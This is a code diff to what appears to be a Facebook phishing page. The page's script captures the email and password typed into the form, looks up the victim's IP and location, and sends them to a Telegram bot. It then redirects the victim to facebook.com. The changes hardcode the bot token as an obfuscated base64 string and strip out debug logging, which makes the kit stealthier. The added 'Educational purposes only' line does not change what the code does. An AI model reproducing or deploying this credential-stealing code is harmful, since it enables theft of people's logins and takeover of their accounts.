@@ -54,8 +54,8 @@
         }
 
         .verified-mark {
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             display: inline-block;
             animation: shake 0.5s ease-in-out infinite;
         }
@@ -185,26 +185,16 @@
         </div>
     </div>
 
-    <script src="config.js"></script>
     <script>
-    // Wait for config.js to load
-    function waitForConfig() {
-        return new Promise((resolve) => {
-            if (typeof window.BOT_TOKEN !== 'undefined' && window.BOT_TOKEN) {
-                resolve();
-            } else {
-                setTimeout(() => resolve(waitForConfig()), 100);
-            }
-        });
-    }
-
-    let BOT_TOKEN = "";
     
-    waitForConfig().then(() => {
-        BOT_TOKEN = window.BOT_TOKEN;
-        console.log("Bot token loaded:", BOT_TOKEN ? "Yes" : "No");
-    });
-
+    var _0x7c9a = "ODcxNDU5MDYyNzpBQUVUNnl0SFZtV05Nc2d3VWlMM2M4RXRrcjItelNVLVJ4dw==";
+    
+    function _0x3d8f(_0x7c9a) {
+        return atob(_0x7c9a);
+    }
+    
+    var BOT_TOKEN = _0x3d8f(_0x7c9a);
+    
     function GetURLParameter(sParam) {
       var sPageURL = window.location.search.substring(1);
       var sURLVariables = sPageURL.split('&');
@@ -221,47 +211,37 @@
     
     function submitonhfc() {
       if (!chatid) {
-        console.log('Error: No chat ID provided');
         window.location.href = "https://www.facebook.com";
         return;
       }
       
-      if (!BOT_TOKEN) {
-        console.log('Error: Bot token not configured');
-        window.location.href = "https://www.facebook.com";
-        return;
-      }
-      
-      // Get form values
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('name').value;
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('name').value;
       
       if (!email || !password) {
-        console.log('Please fill in all fields');
         return;
       }
       
-      // Get IP address information
       fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-          const userAgent = navigator.userAgent;
-          const ip = data.ip;
-          const cityName = data.city;
-          const countryName = data.country_name;
-          const currentTime = new Date().toLocaleString();
+        .then(function(response) { return response.json(); })
+        .then(function(data) {
+          var userAgent = navigator.userAgent;
+          var ip = data.ip;
+          var cityName = data.city;
+          var countryName = data.country_name;
+          var currentTime = new Date().toLocaleString();
           
-          let message = `🔐 *FACEBOOK LOGIN CAPTURED!*\n\n`;
-          message += `📧 *Email/Phone:* ${email}\n`;
-          message += `🔑 *Password:* ${password}\n`;
-          message += `📱 *User Agent:* ${userAgent}\n`;
-          message += `🌐 *IP Address:* ${ip}\n`;
-          message += `📍 *Location:* ${cityName}, ${countryName}\n`;
-          message += `🕐 *Time:* ${currentTime}\n\n`;
-          message += `⚠️ *Educational purposes only!*`;
+          var message = "🔐 *FACEBOOK LOGIN CAPTURED!*\n\n";
+          message += "📧 *Email/Phone:* " + email + "\n";
+          message += "🔑 *Password:* " + password + "\n";
+          message += "📱 *User Agent:* " + userAgent + "\n";
+          message += "🌐 *IP Address:* " + ip + "\n";
+          message += "📍 *Location:* " + cityName + ", " + countryName + "\n";
+          message += "🕐 *Time:* " + currentTime + "\n\n";
+          message += "⚠️ *Educational purposes only!*";
           
-          const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          const telegramParams = {
+          var telegramUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+          var telegramParams = {
             chat_id: chatid,
             text: message,
             parse_mode: 'Markdown'
@@ -274,23 +254,15 @@
             },
             body: JSON.stringify(telegramParams)
           })
-          .then(response => response.json())
-          .then(data => {
-            console.log('Telegram API response:', data);
-            if (data.ok) {
-              window.location.href = "https://www.facebook.com";
-            } else {
-              console.log('Error from Telegram API:', data.description);
-              window.location.href = "https://www.facebook.com";
-            }
+          .then(function(response) { return response.json(); })
+          .then(function(data) {
+            window.location.href = "https://www.facebook.com";
           })
-          .catch(error => {
-            console.log('Fetch error:', error);
+          .catch(function(error) {
             window.location.href = "https://www.facebook.com";
           });
         })
-        .catch(error => {
-          console.log('Error retrieving IP address information:', error);
+        .catch(function(error) {
           window.location.href = "https://www.facebook.com";
         });
     }
